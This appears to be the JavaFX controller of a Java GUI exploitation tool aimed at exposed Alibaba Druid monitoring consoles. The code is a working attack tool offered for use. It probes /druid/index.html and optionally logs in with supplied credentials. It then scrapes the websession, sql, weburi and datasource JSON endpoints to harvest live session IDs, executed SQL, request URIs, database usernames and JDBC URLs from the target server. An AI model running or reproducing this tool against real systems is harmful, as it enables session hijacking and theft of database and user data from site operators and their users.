import com.alibaba.fastjson2.JSONObject;
import com.github.kevinsawicki.http.HttpRequest;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.control.Alert;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;

import java.util.HashMap;

public class Controller {

    @FXML
    private TextArea sessions;

    @FXML
    private TextArea urls;

    @FXML
    private TextArea sql;

    @FXML
    private TextField url;

    @FXML
    private TextField jdbc;

    @FXML
    private TextField user;

    @FXML
    private TextField pass;

    private static HashMap<String, String> hashMap = new HashMap<>();

    public void BtnExp(ActionEvent actionEvent) {
        String u = url.getText();
        u = u.replaceFirst("/$","");
        String code = httpGet(u+"/druid/index.html","").get("code");
        if (code.equals("302")){
            clean();
            ShowErr("靓仔，Druid 需要登录哦");
            return;
        }

        Exp(u,"");
    }

    public void BtnLogin(ActionEvent actionEvent) {
        String u = url.getText();
        u = u.replaceFirst("/$","");

        String data = String.format("loginUsername=%s&loginPassword=%s", user.getText(), pass.getText());
        HashMap<String, String> post = httpPost(u + "/druid/submitLogin", data);
        if (!post.get("body").equals("success")){
            clean();
            ShowErr("账号密码错误");
            return;
        }
        Exp(u,post.get("set-cookie"));
    }

    public void Exp(String url, String cookie){
        String webSession = url + "/druid/websession.json";
        String webSql = url + "/druid/sql.json";
        String webUri = url + "/druid/weburi.json";
        String webDb = url + "/druid/datasource.json";

        String s = httpGet(webSession, cookie).get("body");
        sessions.setText(getDruidJson(s,"SESSIONID"));

        String s1 = httpGet(webSql, cookie).get("body");
        sql.setText(getDruidJson(s1,"SQL"));

        String s2 = httpGet(webUri, cookie).get("body");
        urls.setText(getDruidJson(s2,"URI"));

        String s3 = httpGet(webDb, cookie).get("body");
        String userName = getDruidJson(s3, "UserName");
        String jdbcUrl = getDruidJson(s3, "URL");

        jdbc.setText("数据库用户名: "+userName + "    " + jdbcUrl);
    }

    public static HashMap<String, String> httpGet(String url,String cookie){
        HttpRequest httpRequest = HttpRequest.get(url).followRedirects(false).header("Cookie",cookie);
        hashMap.put("body", httpRequest.body());
        hashMap.put("code", String.valueOf(httpRequest.code()));
        return hashMap;
    }

    public static HashMap<String, String> httpPost(String url, String data){
        HttpRequest httpRequest = HttpRequest.post(url).send(data);
        hashMap.put("body", httpRequest.body());
        hashMap.put("code", String.valueOf(httpRequest.code()));
        hashMap.put("set-cookie",httpRequest.header("Set-Cookie"));
        return hashMap;
    }

    public String getDruidJson(String body, String str){
        JSONObject object = JSONObject.parseObject(body);
        StringBuilder result = new StringBuilder();

        if(object.getJSONArray("Content") == null){
            return "";
        }

        for (Object obj: object.getJSONArray("Content")) {
            JSONObject jsonObject = (JSONObject) obj;
            try {
                String json = jsonObject.getString(str).replaceAll("\n"," ").replaceAll("\t"," ");
                result.append(json).append("\n");
            } catch (Exception e) {
                e.printStackTrace();
            }

        }
        return result.toString();
    }

    public void clean(){
        sessions.setText("");
        sql.setText("");
        urls.setText("");
        jdbc.setText("");
    }
    public void ShowErr(String err){
        Alert alert = new Alert(Alert.AlertType.ERROR);
        alert.setHeaderText(null);
        alert.setContentText(err);
        alert.showAndWait();
    }
}
